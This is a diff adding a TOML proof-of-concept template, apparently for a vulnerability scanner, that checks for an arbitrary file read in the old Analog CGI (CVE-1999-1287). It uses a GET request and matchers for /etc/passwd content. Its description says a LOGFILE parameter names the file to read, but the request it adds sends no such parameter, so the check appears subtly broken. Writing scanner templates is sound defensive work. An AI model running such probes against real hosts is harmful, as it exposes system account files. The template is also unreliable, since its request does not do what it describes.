@@ -1,0 +1,36 @@
+[info]
+author = "AVE"
+description = "Analog 3.0 及更早版本的 forms CGI 接口存在任意文件读取漏洞。通过向 analog CGI 传递 LOGFILE 参数指定系统文件路径（如 /etc/passwd），Analog 会读取并解析该文件，将其内容输出到生成的 HTML 报告中，导致敏感信息泄露。"
+id = "POC-AVE-1999-1031"
+name = "Analog 任意文件读取漏洞 PoC"
+severity = "medium"
+tags = ["cve-1999-1287"]
+vuln_id = [
+    "CVE-1999-1287",
+    "AVE-1999-1031",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/analog"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "/bin/bash",
+    "/bin/sh",
+]
